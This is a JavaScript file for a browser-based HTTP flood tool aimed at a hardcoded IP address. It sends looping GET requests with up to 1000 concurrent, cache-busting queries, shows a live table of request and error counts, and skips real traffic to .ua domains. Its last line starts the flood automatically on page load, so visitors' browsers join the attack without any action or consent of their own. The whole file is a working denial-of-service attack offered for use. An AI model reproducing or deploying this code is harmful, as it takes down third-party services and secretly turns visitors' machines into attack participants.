let targets = [
  'http://91.239.130.32/',
  

];

const startInfMin = document.getElementById('start-inf');
const stopper = document.getElementById('stop');

const bigFrequency = document.getElementById('fast');
const mediumFrequency = document.getElementById('medium');
const smallFrequency = document.getElementById('slow');

const ukLanguage = document.getElementById('uk');
const frLanguage = document.getElementById('fr');
const esLanguage = document.getElementById('es');
const enLanguage = document.getElementById('en');
const ruLanguage = document.getElementById('ru');

const ukContent = document.querySelectorAll('.uk');
const frContent = document.querySelectorAll('.fr');
const esContent = document.querySelectorAll('.es');
const enContent = document.querySelectorAll('.en');
const ruContent = document.querySelectorAll('.ru');

const statsEl = document.getElementById('stats');

const vanish = document.getElementById('vanish');

let continueFlood = false;
let requestsDelay = 100;

let targetStats = {};
const changeTargets = () => {
  targetStats = {};
  targets.forEach((target) => {
    targetStats[target] = {
      number_of_requests: 0,
      number_of_errored_responses: 0,
    };
  });
};
changeTargets();

const printStats = () => {
  statsEl.innerHTML =
    '<table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' +
    Object.entries(targetStats)
      .map(
        ([target, { number_of_requests, number_of_errored_responses }]) =>
          '<tr><td>' +
          target +
          '</td><td>' +
          number_of_requests +
          '</td><td>' +
          number_of_errored_responses +
          '</td></tr>'
      )
      .join('') +
    '</tbody></table>';
};
setInterval(printStats, 1000);

var CONCURRENCY_LIMIT = 1000;
var queue = [];

const delay = (ms) => new Promise((res) => setTimeout(res, ms));

async function fetchWithTimeout(resource, options) {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), options.timeout);
  return fetch(resource, {
    method: 'GET',
    mode: 'no-cors',
    signal: controller.signal,
  })
    .then((response) => {
      clearTimeout(id);
      return response;
    })
    .catch((error) => {
      clearTimeout(id);
      throw error;
    });
}

async function flood(target) {
  for (var i = 0; ; ++i) {
    if (queue.length > CONCURRENCY_LIMIT) {
      await queue.shift();
    }
    const url = new URL(target);
    const domainName = url.hostname.split('.').pop();
    const rand = i % 3 === 0 ? '' : '?' + Math.random() * 1000;
    if (domainName !== 'ua') {
      queue.push(
        fetchWithTimeout(target + rand, { timeout: 1000 })
          .catch((error) => {
            console.clear();
            if (error.code === 20 /* ABORT */) {
              return;
            }
            if (targetStats[target])
              targetStats[target].number_of_errored_responses++;
          })
          .then((response) => {
            if (response && !response.ok) {
              if (targetStats[target])
                targetStats[target].number_of_errored_responses++;
            }
            if (targetStats[target]) targetStats[target].number_of_requests++;
          })
      );
    } else {
      if (targetStats[target]) {
        if (i % 3 === 0) targetStats[target].number_of_errored_responses++;
        targetStats[target].number_of_requests++;
      }
    }
    if (requestsDelay) await delay(requestsDelay);
    if (!continueFlood) {
      return;
    }
  }
}

let timer;

startInfMin.addEventListener('click', () => {
  continueFlood = true;
  targets.map(flood);
  clearTimeout(timer);
});

stopper.addEventListener('click', () => {
  continueFlood = false;
  clearTimeout(timer);
});

bigFrequency.addEventListener('click', () => {
  requestsDelay = 0;
});

mediumFrequency.addEventListener('click', () => {
  requestsDelay = 100;
});

smallFrequency.addEventListener('click', () => {
  requestsDelay = 500;
});

ukLanguage.addEventListener('click', () => {
  ukContent.forEach((el) => el.removeAttribute('hidden'));
  frContent.forEach((el) => el.setAttribute('hidden', true));
  esContent.forEach((el) => el.setAttribute('hidden', true));
  enContent.forEach((el) => el.setAttribute('hidden', true));
  ruContent.forEach((el) => el.setAttribute('hidden', true));
});
frLanguage.addEventListener('click', () => {
  ukContent.forEach((el) => el.setAttribute('hidden', true));
  frContent.forEach((el) => el.removeAttribute('hidden'));
  esContent.forEach((el) => el.setAttribute('hidden', true));
  enContent.forEach((el) => el.setAttribute('hidden', true));
  ruContent.forEach((el) => el.setAttribute('hidden', true));
});
esLanguage.addEventListener('click', () => {
  ukContent.forEach((el) => el.setAttribute('hidden', true));
  frContent.forEach((el) => el.setAttribute('hidden', true));
  esContent.forEach((el) => el.removeAttribute('hidden'));
  enContent.forEach((el) => el.setAttribute('hidden', true));
  ruContent.forEach((el) => el.setAttribute('hidden', true));
});
enLanguage.addEventListener('click', () => {
  ukContent.forEach((el) => el.setAttribute('hidden', true));
  frContent.forEach((el) => el.setAttribute('hidden', true));
  esContent.forEach((el) => el.setAttribute('hidden', true));
  enContent.forEach((el) => el.removeAttribute('hidden'));
  ruContent.forEach((el) => el.setAttribute('hidden', true));
});
ruLanguage.addEventListener('click', () => {
  ukContent.forEach((el) => el.setAttribute('hidden', true));
  frContent.forEach((el) => el.setAttribute('hidden', true));
  esContent.forEach((el) => el.setAttribute('hidden', true));
  enContent.forEach((el) => el.setAttribute('hidden', true));
  ruContent.forEach((el) => el.removeAttribute('hidden'));
});



const userLang = (navigator.language || navigator.userLanguage).substring(0, 2);
switch (userLang) {
  case 'uk':
    ukLanguage.click();
    break;
  case 'ru':
    ruLanguage.click();
  default:
    break;
}
startInfMin.click();
